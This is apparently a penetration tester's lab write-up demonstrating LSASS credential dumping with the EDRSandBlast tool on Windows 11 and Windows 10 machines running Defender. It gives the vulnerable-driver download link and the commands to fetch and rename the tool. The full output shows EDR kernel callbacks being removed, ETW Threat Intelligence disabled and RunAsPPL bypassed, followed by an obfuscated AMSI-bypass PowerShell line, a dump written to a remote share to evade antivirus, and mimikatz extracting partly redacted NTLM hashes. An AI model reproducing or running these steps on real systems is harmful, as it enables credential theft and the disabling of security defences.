==================================================================================================================================
OS Credential Dumping (LSASS) using 'EDRSandBlast'
==================================================================================================================================

After a user logs on a Windows computer, the system generates and stores a variety of credential materials in LSASS process memory. 
Our objective is to extract the password hashes of the local and/or domain accounts stored in the memory of the Local Security 
Authority Subsystem Service (LSASS process) of a target Windows computer. 
A valid local or domain Windows account member of the 'local administrator' group is required for dumping the LSASS process.

> Usefull link: https://attack.mitre.org/techniques/T1003/001/

The tool 'EDRSandBlast' uses the 'Bring Your Own Vulnerable Driver' (BYOVD) technique to be able to dump the LSASS process memory of a 
Windows machine even if LSASS protections are enabled (RunAsPPL, Credential Guard). 
Moreover, this tool allows to bypass and evade multiple EDR detections (e.g. Notify Routine callbacks, Object Callbacks and ETW TI provider). 

Techniques implemented by 'EDRSandBlast'
----------------------------------------
> EDR bypass through Object Callbacks removal
> EDR bypass through userland hooking bypass
> Vulnerable drivers exploitation (RTCore64.sys driver)
> RunAsPPL bypass
> Credential Guard bypass

Usefull links
--------------
> Github: https://github.com/wavestone-cdt/EDRSandblast
> The vulnerable RTCore64.sys driver can be retrieved at: http://download-eu2.guru3d.com/afterburner/%5BGuru3D.com%5D-MSIAfterburnerSetup462Beta2.zip

Important notes 
----------------
During my tests:
> on a Windows 11 laptop with LSA protection (RunAsPPL) enabled, the tool 'EDRSandBlast' was not very stable (with the 'kernel mode') .
  I don't recommend using it in a production environment during 'real life' audit/pentest/red team engagements.
> on a Windows 10 laptop with no LSA protection (no PPL), the tool was stable and working well.
  Though, to avoid the detection and deletion of the lsass memory dump file by the Windows Defender AV, I had to write it on a remote share.


=================================================================================================================================================
PoC/Test 1 - Use 'EDRSandBlast' to dump the LSASS protected process memory (RunAsPPL) of an up-to-date Windows 11 laptop (with Defender AV enabled)
=================================================================================================================================================

--------------------------------------------------------------------------------------------------------------
Step 1 - Compile the tool 'EDRSandBlast' with Visual Studio and download the vulnerable driver (RTCore64.sys)
--------------------------------------------------------------------------------------------------------------

> Github page: https://github.com/wavestone-cdt/EDRSandblast

Visual Studio - Build logs
---------------------------
Build started...
1>------ Build started: Project: EDRSandblast_StaticLibrary, Configuration: Release x64 ------
2>------ Build started: Project: EDRSandblast_Core, Configuration: Release x64 ------
2>Assembling Utils\SW2_Syscalls_stubs.x64.asm...
1>EDRSandblast_API.c
2>DriverDBUtil.c
2>DriverRTCore.c
1>EDRSandblast_StaticLibrary.vcxproj -> C:\Users\pentester\Documents\Tools-Pentest\7-Password-Dump&Cracking\EDRSandblast-master\x64\Release\EDRSandblast_StaticLibrary.lib
2>ETWThreatIntel.c
2>KernelCallbacks.c
2>KernelUtils.c
2>ObjectCallbacks.c
<SNIP>
2>PEParser.c
2>StringUtils.c
2>SignatureOps.c
2>SW2_Syscalls.c
2>SyscallProcessUtils.c
2>WdigestOffsets.c
2>WindowsServiceOps.c
2>FirewallOps.cpp
2>EDRSandblast.vcxproj -> C:\Users\pentester\Documents\Tools-Pentest\7-Password-Dump&Cracking\EDRSandblast-master\x64\Release\EDRSandblast_Core.lib
3>------ Build started: Project: EDRSandblast_CLI, Configuration: Release x64 ------
4>------ Build started: Project: EDRSandblast_LsassDump, Configuration: Release x64 ------
4>EDRSandblast_LsassDump.c
3>EDRSandblast.c
3>C:\Users\pentester\Documents\Tools-Pentest\7-Password-Dump&Cracking\EDRSandblast-master\EDRSandblast_CLI\EDRSandblast.c(46,11): warning C4244: 'function': conversion from 'time_t' to 'unsigned int', possible loss of data
4>Previous IPDB not found, fall back to full compilation.
4>MSVCRT.lib(initializers.obj) : warning LNK4098: defaultlib 'libcmt.lib' conflicts with use of other libs; use /NODEFAULTLIB:library
4>Generating code
3>Generating code
3>Previous IPDB not found, fall back to full compilation.
4>All 141 functions were compiled because no usable IPDB/IOBJ from previous compilation was found.
4>Finished generating code
4>EDRSandblast_LsassDump.vcxproj -> C:\Users\pentester\Documents\Tools-Pentest\7-Password-Dump&Cracking\EDRSandblast-master\x64\Release\EDRSandblast_LsassDump.exe
4>Done building project "EDRSandblast_LsassDump.vcxproj".
3>All 160 functions were compiled because no usable IPDB/IOBJ from previous compilation was found.
3>Finished generating code
3>EDRSandblast_CLI.vcxproj -> C:\Users\pentester\Documents\Tools-Pentest\7-Password-Dump&Cracking\EDRSandblast-master\x64\Release\EDRSandblast.exe
3>Done building project "EDRSandblast_CLI.vcxproj".
========== Build: 4 succeeded, 0 failed, 0 up-to-date, 0 skipped ==========
========== Build started at 8:50 PM and took 07.842 seconds ==========


Then gather the vulnerable 'RTCore64.sys' driver. 
You need to extract it from the file 'MSIAfterburnerSetup462Beta2.exe' that can be donwload using the link below:
=> http://download-eu2.guru3d.com/afterburner/%5BGuru3D.com%5D-MSIAfterburnerSetup462Beta2.zip


-----------------------------------------------------------------------------------------------------------------
Step 2 - Download the tool 'EDRSandBlast' and the vulnerable driver 'RTCore64.sys' on a target Windows 11 laptop
-----------------------------------------------------------------------------------------------------------------

Target: Windows 11 laptop with the LSA protection (RunAsPPL) enabled
--------------------------------------------------------------------------
PS C:\Users\User1\Documents> systeminfo
Host Name:                 LAPTOPW11
OS Name:                   Microsoft Windows 11 Enterprise
OS Version:                10.0.22621 N/A Build 22621
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          User1
Registered Organization:
Product ID:                00329-10286-90777-AA386
Original Install Date:     9/10/2023, 12:01:54 PM
System Boot Time:          9/10/2023, 12:25:17 PM
<SNIP>

LSA protection (RunAsPPL) is enabled
-------------------------------------
> Registry Hive: HKEY_LOCAL_MACHINE
> Registry Path: SYSTEM\CurrentControlSet\Control\Lsa
> Value Name: RunAsPPL
> Value Type: REG_DWORD
> Enabled Value: 1

Note: Windows enables the ability to launch the lsass.exe process as a Process Protected Light (PPL), which prevents any non-PPL process 
      from using OpenProcess() to access lsass.exe. 

Defender AV is enabled
----------------------
PS C:\Users\User1\Documents> Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled,IsTamperProtected | FL

RealTimeProtectionEnabled     : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True
IsTamperProtected             : True


The tool and the driver are downloaded and renamed by 'EDRS.exe' and 'audit.sys'
--------------------------------------------------------------------------------
PS C:\Users\User1\Documents> wget -URI http://192.168.1.144:8080/EDRSandBlast.exe -OutFile EDRS.exe
PS C:\Users\User1\Documents> wget -URI http://192.168.1.144:8080/RTCore64.sys -OutFile audit.sys

PS C:\Users\User1\Documents> dir

    Directory: C:\Users\User1\Documents

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/10/2023   1:32 PM          14024 audit.sys
-a----         9/10/2023  12:41 PM         328192 EDRS.exe


---------------------------------------------------------------------------------------------------------------
Step 3 - Execute the tool with the option "--kernelmode" to be able to bypass LSA protection (RunAsPPL) and
         dump the LSASS memory
---------------------------------------------------------------------------------------------------------------


C:\Users\User1\Documents>EDRS.exe --verbose dump --kernelmode --driver C:\Users\User1\Documents\audit.sys --dump-output audit --internet
  ______ _____  _____   _____                 _ _     _           _
 |  ____|  __ \|  __ \ / ____|               | | |   | |         | |
 | |__  | |  | | |__) | (___   __ _ _ __   __| | |__ | | __ _ ___| |_
 |  __| | |  | |  _  / \___ \ / _` | '_ \ / _` | '_ \| |/ _` / __| __|
 | |____| |__| | | \ \ ____) | (_| | | | | (_| | |_) | | (_| \__ | |_
 |______|_____/|_|  \_|_____/ \__,_|_| |_|\__,_|_.__/|_|\__,_|___/\__|

  D3FC0N 30 Edition | Thomas DIOT (@_Qazeer) & Maxime MEIGNAN (@th3m4ks)

[!] If kernel mode bypass is enabled, it is recommended to enable usermode bypass as well (e.g. to unhook the NtLoadDriver API call)

[===== KERNEL MODE =====]

[+] Setting up prerequisites for the kernel read/write primitives...
[+] Downloading kernel related offsets from the MS Symbol Server (will drop a .pdb file in current directory)
[+] Downloading offsets succeeded !
[+] Ntoskrnl offsets:  d0c2a0 | d0c4a0 | d0c6a0 | 87a | c31fe0 | 20 | 60 | d1da18 | d1da40 |c8
[+] Installing vulnerable driver...
[*] '7VXxlMHm' service was not present
[+] '7VXxlMHm' service is successfully registered
[+] '7VXxlMHm' service ACL configured to for Everyone
[+] '7VXxlMHm' service started

[+] Checking if any EDR kernel notify rountines are set for image loading, process and thread creations...
[+] [NotifyRountines]   Enumerating process creation callbacks
[+] [NotifyRountines]   PspProcessCreateNotifyRoutine: 0xfffff8076730c2a0
[+] [NotifyRountines]           fffff807691a5500 [cng.sys + 0x5500]
[+] [NotifyRountines]           fffff80769b671f0 [WdFilter.sys + 0x471f0]
[+] [NotifyRountines]           Found callback belonging to EDR driver WdFilter.sys [callback addr : 0xfffff8076730c2a8 | callback struct : 0xffffb004dc7db60f | callback function : 0xfffff80769b671f0]
[+] [NotifyRountines]           fffff80768fdc460 [ksecdd.sys + 0x1c460]
[+] [NotifyRountines]           fffff8076a163fd0 [tcpip.sys + 0x13fd0]
[+] [NotifyRountines]           fffff8076a75d980 [iorate.sys + 0xd980]
[+] [NotifyRountines]           fffff80769128890 [CI.dll + 0x88890]
[+] [NotifyRountines]           fffff8076c2b79f0 [dxgkrnl.sys + 0x179f0]
[+] [NotifyRountines]           fffff8076f4bf560 [appid.sys + 0x1f560]
[+] [NotifyRountines]           fffff807897ccd00 [peauth.sys + 0x3cd00]
[+] [NotifyRountines]           fffff80789891550 [wtd.sys + 0x1550]
[+] [NotifyRountines]   Found a total of 1 EDR / security products driver(s)
[+] [NotifyRountines]   Enumerating thread creation callbacks
[+] [NotifyRountines]   PspThreadCreateNotifyRoutine: 0xfffff8076730c4a0
[+] [NotifyRountines]           fffff80769b68930 [WdFilter.sys + 0x48930]
[+] [NotifyRountines]           Found callback belonging to EDR driver WdFilter.sys [callback addr : 0xfffff8076730c4a0 | callback struct : 0xffffb004dc7db63f | callback function : 0xfffff80769b68930]
[+] [NotifyRountines]           fffff80769b68690 [WdFilter.sys + 0x48690]
[+] [NotifyRountines]           Found callback belonging to EDR driver WdFilter.sys [callback addr : 0xfffff8076730c4a8 | callback struct : 0xffffb004dc7db69f | callback function : 0xfffff80769b68690]
[+] [NotifyRountines]           fffff80789661010 [mmcss.sys + 0x1010]
[+] [NotifyRountines]   Found a total of 2 EDR / security products driver(s)
[+] [NotifyRountines]   Enumerating image loading callbacks
[+] [NotifyRountines]   PspLoadImageNotifyRoutine: 0xfffff8076730c6a0
[+] [NotifyRountines]           fffff80769b67ba0 [WdFilter.sys + 0x47ba0]
[+] [NotifyRountines]           Found callback belonging to EDR driver WdFilter.sys [callback addr : 0xfffff8076730c6a0 | callback struct : 0xffffb004dc7db57f | callback function : 0xfffff80769b67ba0]
[+] [NotifyRountines]           fffff8076cdb5710 [ahcache.sys + 0x25710]
[+] [NotifyRountines]   Found a total of 1 EDR / security products driver(s)

[+] Checking if EDR callbacks are registered on processes and threads handle creation/duplication...
[+] [ObjectCallblacks]  Enumerating Process object callbacks :
[+] [ObjectCallblacks]          Callback at FFFFD486A092B740 for handle creations & duplications:
[+] [ObjectCallblacks]                  Status: Enabled
[+] [ObjectCallblacks]                  Preoperation at 0xfffff80769b65020 [WdFilter.sys + 0x45020]
[+] [ObjectCallblacks]                  Callback belongs to an EDR and is enabled!
[+] [ObjectCallblacks]  Enumerating Thread object callbacks :
[+] [ObjectCallblacks]  Object callbacks are present !

[+] [ETWTI]     Checking the ETW Threat Intelligence Provider state...
[+] [ETWTI]     Found ETW Threat Intel provider _ETW_REG_ENTRY at 0xffffb004dc29e490
[+] [ETWTI]     ETW Threat Intelligence Provider is ENABLED!

[+] Process is NOT "safe" to launch our payload, removing monitoring and starting another process...

[+] [ETWTI]     Found ETW Threat Intel provider _ETW_REG_ENTRY at 0xffffb004dc29e490
[+] [ETWTI]     Disabling the ETW Threat Intel provider by patching ProviderEnableInfo at 0xffffb004dc0a53f0 with 0x00.
[+] [ETWTI]     The ETW Threat Intel provider was successfully disabled!

[+] Removing kernel callbacks registered by EDR for process creation, thread creation and image loading...
[+] [NotifyRountines]   Removing process creation callbacks
[+] [NotifyRountines]   Removing callback of EDR driver "WdFilter.sys" [callback addr: 0xfffff8076730c2a8 | callback struct: 0xffffb004dc7db60f | callback function: 0xfffff80769b671f0]
[+] [NotifyRountines]   Removing thread creation callbacks
[+] [NotifyRountines]   Removing callback of EDR driver "WdFilter.sys" [callback addr: 0xfffff8076730c4a0 | callback struct: 0xffffb004dc7db63f | callback function: 0xfffff80769b68930]
[+] [NotifyRountines]   Removing callback of EDR driver "WdFilter.sys" [callback addr: 0xfffff8076730c4a8 | callback struct: 0xffffb004dc7db69f | callback function: 0xfffff80769b68690]
[+] [NotifyRountines]   Removing image loading callbacks
[+] [NotifyRountines]   Removing callback of EDR driver "WdFilter.sys" [callback addr: 0xfffff8076730c6a0 | callback struct: 0xffffb004dc7db57f | callback function: 0xfffff80769b67ba0]

[+] Disabling kernel callbacks registered by EDR for process and thread opening or handle duplication...
[+] [ObjectCallblacks]  Disabling WdFilter.sys callback...

[+] All EDR drivers were successfully removed from Kernel callbacks!

==================================================
Starting a new unmonitored process...
==================================================

[!] If kernel mode bypass is enabled, it is recommended to enable usermode bypass as well (e.g. to unhook the NtLoadDriver API call)

[===== KERNEL MODE =====]

[+] Setting up prerequisites for the kernel read/write primitives...
[+] Downloading kernel related offsets from the MS Symbol Server (will drop a .pdb file in current directory)
[+] Downloading offsets succeeded !
[+] Ntoskrnl offsets:  d0c2a0 | d0c4a0 | d0c6a0 | 87a | c31fe0 | 20 | 60 | d1da18 | d1da40 |c8
[+] Vulnerable driver is already running!

[+] Checking if any EDR kernel notify rountines are set for image loading, process and thread creations...
[+] [NotifyRountines]   Enumerating process creation callbacks
[+] [NotifyRountines]   PspProcessCreateNotifyRoutine: 0xfffff8076730c2a0
[+] [NotifyRountines]           fffff807691a5500 [cng.sys + 0x5500]
[+] [NotifyRountines]           fffff80768fdc460 [ksecdd.sys + 0x1c460]
[+] [NotifyRountines]           fffff8076a163fd0 [tcpip.sys + 0x13fd0]
[+] [NotifyRountines]           fffff8076a75d980 [iorate.sys + 0xd980]
[+] [NotifyRountines]           fffff80769128890 [CI.dll + 0x88890]
[+] [NotifyRountines]           fffff8076c2b79f0 [dxgkrnl.sys + 0x179f0]
[+] [NotifyRountines]           fffff8076f4bf560 [appid.sys + 0x1f560]
[+] [NotifyRountines]           fffff807897ccd00 [peauth.sys + 0x3cd00]
[+] [NotifyRountines]           fffff80789891550 [wtd.sys + 0x1550]
[+] [NotifyRountines]   No EDR driver(s) found!
[+] [NotifyRountines]   Enumerating thread creation callbacks
[+] [NotifyRountines]   PspThreadCreateNotifyRoutine: 0xfffff8076730c4a0
[+] [NotifyRountines]           fffff80789661010 [mmcss.sys + 0x1010]
[+] [NotifyRountines]   No EDR driver(s) found!
[+] [NotifyRountines]   Enumerating image loading callbacks
[+] [NotifyRountines]   PspLoadImageNotifyRoutine: 0xfffff8076730c6a0
[+] [NotifyRountines]           fffff8076cdb5710 [ahcache.sys + 0x25710]
[+] [NotifyRountines]   No EDR driver(s) found!

[+] Checking if EDR callbacks are registered on processes and threads handle creation/duplication...
[+] [ObjectCallblacks]  Enumerating Process object callbacks :
[+] [ObjectCallblacks]          Callback at FFFFD486A092B740 for handle creations & duplications:
[+] [ObjectCallblacks]                  Status: Disabled
[+] [ObjectCallblacks]                  Preoperation at 0xfffff80769b65020 [WdFilter.sys + 0x45020]
[+] [ObjectCallblacks]                  Callback belongs to an EDR but is disabled.
[+] [ObjectCallblacks]  Enumerating Thread object callbacks :
[+] [ObjectCallblacks]  Object callbacks are not found !

[+] [ETWTI]     Checking the ETW Threat Intelligence Provider state...
[+] [ETWTI]     Found ETW Threat Intel provider _ETW_REG_ENTRY at 0xffffb004dc29e490
[+] [ETWTI]     ETW Threat Intelligence Provider is DISABLED!

[+] Process is "safe" to launch our payload


[+] RunPPL bypass: Self protect our current process as Light WinTcb(PsProtectedSignerWinTcb - Light) since PPL is supported by the OS. This will allow access to LSASS if RunAsPPL is enabled
[*] [ProcessProtection] Self process handle: 0x20c
[+] [ProcessProtection] Found the handle of the current process (PID: 5624): 0x20c at 0xffffb004e0d1a080
[+] [ProcessProtection] Found self process EPROCCES struct at 0xffffb004e0d1a080
[*] [ProcessProtection] Protecting own process by setting the EPROCESS's ProtectionLevel (at 0xffffb004e0d1a8fa) to 0x61 (PS_PROTECTED_WINTCB_LIGHT)
[+] Attempting to dump the process
[+] lsass.exe sucessfully dumped to: C:\Users\User1\Documents\audit

[+] Restoring EDR's kernel notify routine callbacks...
[+] [NotifyRountines]   Restoring process creation callbacks
[+] [NotifyRountines]   Restoring callback of EDR driver "WdFilter.sys" [callback addr: 0xfffff8076730c2a8 | callback struct: 0xffffb004dc7db60f | callback function: 0xfffff80769b671f0]
[+] [NotifyRountines]   Restoring thread creation callbacks
[+] [NotifyRountines]   Restoring callback of EDR driver "WdFilter.sys" [callback addr: 0xfffff8076730c4a0 | callback struct: 0xffffb004dc7db63f | callback function: 0xfffff80769b68930]
[+] [NotifyRountines]   Restoring callback of EDR driver "WdFilter.sys" [callback addr: 0xfffff8076730c4a8 | callback struct: 0xffffb004dc7db69f | callback function: 0xfffff80769b68690]
[+] [NotifyRountines]   Restoring image loading callbacks
[+] [NotifyRountines]   Restoring callback of EDR driver "WdFilter.sys" [callback addr: 0xfffff8076730c6a0 | callback struct: 0xffffb004dc7db57f | callback function: 0xfffff80769b67ba0]

[+] Restoring EDR's kernel object callbacks...
[+] [ObjectCallblacks]  Enabling WdFilter.sys callback...

[+] [ETWTI]     Found ETW Threat Intel provider _ETW_REG_ENTRY at 0xffffb004dc29e490
[+] [ETWTI]     (Re)enabling the ETW Threat Intel provider by patching ProviderEnableInfo at 0xffffb004dc0a53f0 with 0x01.
[+] [ETWTI]     The ETW Threat Intel provider was successfully enabled!

[*] Uninstalling vulnerable driver...
[+] '7VXxlMHm' service stopped
[+] The vulnerable driver was successfully uninstalled!


C:\Users\User1\Documents> dir
 Volume in drive C has no label.
 Volume Serial Number is E661-6B83

 Directory of C:\Users\User1\Documents

09/10/2023  01:40 PM    <DIR>          .
09/10/2023  12:10 PM    <DIR>          ..
09/10/2023  01:40 PM        55,646,163 audit
09/10/2023  01:32 PM            14,024 audit.sys
09/10/2023  12:41 PM           328,192 EDRS.exe
               4 File(s)     56,104,091 bytes
               2 Dir(s)  43,794,927,616 bytes free

Conclusions
------------
=> The tool was able to dump the LSASS protected process memory (file 'audit') :-)
=> However, this tool was not very stable during my tests and my Windows 11 VM froze several times.
   I don't recommend using it in a production environment during 'real life' audit/pentest/red team engagements.


Other test/PoC - As expected, without using the option '--kernelmode' it is not possible to dump the LSASS protected process
-----------------------------------------------------------------------------------------------------------------------------

C:\Users\User1\Documents>EDRS.exe dump --verbose --usermode --dump-output audit
  ______ _____  _____   _____                 _ _     _           _.
 |  ____|  __ \|  __ \ / ____|               | | |   | |         | |
 | |__  | |  | | |__) | (___   __ _ _ __   __| | |__ | | __ _ ___| |_
 |  __| | |  | |  _  / \___ \ / _` | '_ \ / _` | '_ \| |/ _` / __| __|
 | |____| |__| | | \ \ ____) | (_| | | | | (_| | |_) | | (_| \__ | |_
 |______|_____/|_|  \_|_____/ \__,_|_| |_|\__,_|_.__/|_|\__,_|___/\__|

  D3FC0N 30 Edition | Thomas DIOT (@_Qazeer) & Maxime MEIGNAN (@th3m4ks)

[!] LSASS dump might fail if RunAsPPL is enabled. Enable --kernelmode to bypass PPL

[===== USER MODE =====]

[+] Detecting userland hooks in all loaded DLLs...
[+] [Hooks]     EDRS.exe (C:\Users\User1\Documents\EDRS.exe): 0x00007FF758E70000
<SNIP>

[+] Process is "safe" to launch our payload

[+] Attempting to dump the process
[!] lsass.exe dump failed: couldn't open process memory (OpenProcesswith error 0x5)
[!] A fatal error occurred during the LSASS dump / execution of cmd.exe



=================================================================================================================================================
PoC/Test 2 - Use 'EDRSandBlast' to dump the LSASS process memory (no PPL) of an up-to-date Windows 10 laptop (with Defender AV enabled)
=================================================================================================================================================

C:\Users\auditor> systeminfo

Host Name:                 PO744653
OS Name:                   Microsoft Windows 10 Professionnel
OS Version:                10.0.19045 N/A Build 19045
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Workstation
OS Build Type:             Multiprocessor Free
<SNIP>


C:\Users\auditor\Desktop> dir
 Volume in drive C is Windows
 Volume Serial Number is F06E-DC58

 Directory of C:\Users\auditor\Desktop

09/18/2023  10:01 PM    <DIR>          .
09/18/2023  10:01 PM    <DIR>          ..
09/10/2023  08:51 PM           328,192 EDRSandblast.exe
08/27/2017  04:44 PM            14,024 RTCore64.sys
<SNIP>


C:\Users\auditor\Desktop>powershell -exec bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\auditor\Desktop> Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled,IsTamperProtected | FL

RealTimeProtectionEnabled : True
IoavProtectionEnabled     : True
AntispywareEnabled        : True
IsTamperProtected         : True


PS C:\Users\auditor\Desktop> ForEach($boat in $superaudit) {if ($boat.Name -like "*iutils") {$cap = $boat}};$data = $cap.GetFields('NonPublic,Static');
ForEach($europe in $data) {if ($europe.Name -like "*itFailed") {$fire = $europe}};$fire.SetValue($null,$true)


PS C:\Users\auditor\Desktop> .\EDRSandblast.exe dump --dump-output "\\192.168.1.254\Disque dur\Test\memory.dmp"
  ______ _____  _____   _____                 _ _     _           _
 |  ____|  __ \|  __ \ / ____|               | | |   | |         | |
 | |__  | |  | | |__) | (___   __ _ _ __   __| | |__ | | __ _ ___| |_
 |  __| | |  | |  _  / \___ \ / _` | '_ \ / _` | '_ \| |/ _` / __| __|
 | |____| |__| | | \ \ ____) | (_| | | | | (_| | |_) | | (_| \__ | |_
 |______|_____/|_|  \_|_____/ \__,_|_| |_|\__,_|_.__/|_|\__,_|___/\__|

  D3FC0N 30 Edition | Thomas DIOT (@_Qazeer) & Maxime MEIGNAN (@th3m4ks)

[!] You did not provide at least one option between --usermode and --kernelmode. Enabling --usermode by default...

[!] LSASS dump might fail if RunAsPPL is enabled. Enable --kernelmode to bypass PPL

[===== USER MODE =====]

[+] Detecting userland hooks in all loaded DLLs...
[+] [Hooks]     EDRSandblast.exe (C:\Users\auditor\Desktop\EDRSandblast.exe): 0x00007FF63B0B0000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     ntdll.dll (C:\Windows\SYSTEM32\ntdll.dll): 0x00007FFE54AB0000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     KERNEL32.DLL (C:\Windows\System32\KERNEL32.DLL): 0x00007FFE53AB0000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     KERNELBASE.dll (C:\Windows\System32\KERNELBASE.dll): 0x00007FFE52600000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     SHLWAPI.dll (C:\Windows\System32\SHLWAPI.dll): 0x00007FFE52C40000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     msvcrt.dll (C:\Windows\System32\msvcrt.dll): 0x00007FFE532B0000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     ADVAPI32.dll (C:\Windows\System32\ADVAPI32.dll): 0x00007FFE53FC0000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     WINHTTP.dll (C:\Windows\SYSTEM32\WINHTTP.dll): 0x00007FFE4E5F0000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     VERSION.dll (C:\Windows\SYSTEM32\VERSION.dll): 0x00007FFE48C10000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     sechost.dll (C:\Windows\System32\sechost.dll): 0x00007FFE547E0000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     dbghelp.dll (C:\Windows\SYSTEM32\dbghelp.dll): 0x00007FFE504D0000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     ucrtbase.dll (C:\Windows\System32\ucrtbase.dll): 0x00007FFE529E0000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     RPCRT4.dll (C:\Windows\System32\RPCRT4.dll): 0x00007FFE53600000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     ole32.dll (C:\Windows\System32\ole32.dll): 0x00007FFE54930000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     combase.dll (C:\Windows\System32\combase.dll): 0x00007FFE53C60000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     GDI32.dll (C:\Windows\System32\GDI32.dll): 0x00007FFE53A10000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     win32u.dll (C:\Windows\System32\win32u.dll): 0x00007FFE52520000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     gdi32full.dll (C:\Windows\System32\gdi32full.dll): 0x00007FFE52200000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     msvcp_win.dll (C:\Windows\System32\msvcp_win.dll): 0x00007FFE52320000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     USER32.dll (C:\Windows\System32\USER32.dll): 0x00007FFE53380000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     OLEAUT32.dll (C:\Windows\System32\OLEAUT32.dll): 0x00007FFE52B10000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     CRYPT32.dll (C:\Windows\System32\CRYPT32.dll): 0x00007FFE523C0000
[+] [Hooks]             No hooks found in this module.
[+] [Hooks]     IMM32.DLL (C:\Windows\System32\IMM32.DLL): 0x00007FFE53350000
[+] [Hooks]             No hooks found in this module.

[+] Process is "safe" to launch our payload

[+] Attempting to dump the process
[+] lsass.exe sucessfully dumped to: \\192.168.1.254\Disque dur\Test\memory.dmp



PS C:\Users\auditor\Desktop> dir "\\192.168.1.254\Disque dur\Test\memory.dmp"

    Directory: \\192.168.1.254\Disque dur\Test

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/18/2023  10:03 PM       61297256 memory.dmp



PS C:\Temp> . .\packed-mimi.ps1
PS C:\Temp> invoke-packed-mimi

  .#####.   mimikatz 2.2.0 (x64) #19041 May 31 2021 00:08:47
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # sekurlsa::minidump memory.dmp
Switch to MINIDUMP : 'memory.dmp'

mimikatz(commandline) # sekurlsa::LogonPasswords
Opening : 'memory.dmp' file for minidump...

Authentication Id : 0 ; 38870364 (00000000:02511d5c)
Session           : Interactive from 2
User Name         : auditor
Domain            : LAB
Logon Server      : DC1
Logon Time        : 9/15/2023 6:27:40 PM
SID               : S-1-5-21-666114207-261065646-224150901-1121
	msv :	
	 [00000003] Primary
	 * Username : auditor
	 * Domain   : LAB
	 * NTLM     : 85a931e082c05f58bd12ccde<SNIP>
	 * SHA1     : 3312401ebc36e003689df7e3<SNIP>
	 * DPAPI    : bba5a02d57ddbc4638558c3a<SNIP>
	tspkg :	
	 * Username : auditor
	 * Domain   : LAB
	 * Password : <SNIP>
	wdigest :	
	 * Username : auditor
	 * Domain   : LAB
	 * Password : (null)
	kerberos :	
	 * Username : auditor
	 * Domain   : LAB.INTRAXA
	 * Password : <SNIP>
	ssp :	
	credman :	
	 [00000000]
	 * Username : cmd
	 * Domain   : 192.168.13.52
	 * Password : (null)
	cloudap :	KO
<SNIP>

